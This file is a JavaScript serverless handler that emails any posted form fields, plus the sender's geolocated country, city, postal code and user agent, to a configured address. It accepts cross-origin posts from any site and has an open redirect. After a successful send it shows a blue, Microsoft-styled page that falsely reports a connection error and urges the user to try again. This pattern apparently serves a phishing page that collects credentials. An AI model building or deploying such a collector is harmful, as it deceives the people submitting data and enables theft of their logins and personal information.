import { Resend } from 'resend';

const FORM_OWNERS = {
  'contact-main': process.env.DEST_EMAIL,
};

// Easy emoji map for form field labels
const LABEL_EMOJIS = {
  name: '👤',
  email: '📧',
  phone: '📱',
  subject: '📝',
  message: '💬',
};

function getLabel(key) {
  const emoji = LABEL_EMOJIS[key.toLowerCase()] || '📌';
  return `${emoji} ${key}`;
}

function escapeHtml(value) {
  return String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function decodeHeader(value, fallback = 'Unknown') {
  if (!value) return fallback;
  try {
    return decodeURIComponent(String(value));
  } catch {
    return String(value);
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Accept');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const formId = String(req.query?.formId || '');
  const recipientEmail = FORM_OWNERS[formId];
  if (!recipientEmail) return res.status(404).json({ error: 'Form not found' });

  const body = req.body && typeof req.body === 'object' ? req.body : {};

  if (body._honeypot) {
    return res.status(200).json({ ok: true });
  }

  const fields = Object.entries(body).filter(([key]) => !key.startsWith('_'));
  if (fields.length === 0) {
    return res.status(400).json({ error: 'No form fields submitted' });
  }

  const country = decodeHeader(req.headers['x-vercel-ip-country']);
  const city = decodeHeader(req.headers['x-vercel-ip-city']);
  const zip = decodeHeader(req.headers['x-vercel-ip-postal-code']);
  const userAgent = String(req.headers['user-agent'] || 'Unknown');

  const locationSummary = `${city} : ${zip}`;
  const subject = `📩 New submission from : 🌍 ${country} , 🏙️ ${city} :`;

  const textBody = [
    ...fields.map(([k, v]) => `${getLabel(k)}\t${String(v ?? '')}`),
    `📍 Location :\t${locationSummary}`,
    '',
    `🖥️ UserAgent :\t${userAgent}`,
  ].join('\n');

  const htmlRows = fields
    .map(
      ([k, v]) =>
        `<tr><td style="padding:6px 10px;font-weight:600;border-bottom:1px solid #eee;">${escapeHtml(
          getLabel(k)
        )}</td><td style="padding:6px 10px;border-bottom:1px solid #eee;">${escapeHtml(
          String(v ?? '')
        )}</td></tr>`
    )
    .join('');

  const htmlBody = `
    <table style="border-collapse:collapse;font-family:sans-serif;font-size:14px;">
      ${htmlRows}
      <tr>
        <td style="padding:6px 10px;font-weight:600;border-bottom:1px solid #eee;">📍 Location :</td>
        <td style="padding:6px 10px;border-bottom:1px solid #eee;">${escapeHtml(locationSummary)}</td>
      </tr>
      <tr>
        <td style="padding:6px 10px;font-weight:600;border-bottom:1px solid #eee;">🖥️ UserAgent</td>
        <td style="padding:6px 10px;border-bottom:1px solid #eee;">${escapeHtml(userAgent)}</td>
      </tr>
    </table>
  `;

  try {
    const resend = new Resend(process.env.RESEND_API_KEY);
    const { error } = await resend.emails.send({
      from: 'Contact Form <onboarding@resend.dev>',
      to: recipientEmail,
      subject,
      text: textBody,
      html: htmlBody,
    });

    if (error) {
      return res.status(502).json({ ok: false, error: error.message });
    }

    if ((req.headers.accept || '').includes('application/json')) {
      return res.status(200).json({ ok: true });
    }

    if (body._redirect && /^https?:\/\//i.test(body._redirect)) {
      return res.redirect(302, body._redirect);
    }

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(`
     <!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Submission Received</title>
    <style>
      body {
        font-family: system-ui, sans-serif;
        display: grid;
        place-items: center;
        height: 100vh;
        margin: 0;
        background-color: #0067B8;
        color: #ffffff;
      }

      .container {
        text-align: center;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 16px;
      }

      .spinner {
        width: 48px;
        height: 48px;
        border: 5px solid rgba(255, 255, 255, 0.3);
        border-top-color: #ffffff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="spinner"></div>
      <h1 style="margin: 0;">⚠️ Please check your internet connection and try again.</h1>
      <p style="margin: 0;">Please open your mail and try again.</p>
    </div>
  </body>
</html>
    `);
  } catch (err) {
    return res.status(500).json({ ok: false, error: 'Failed to process submission' });
  }
}
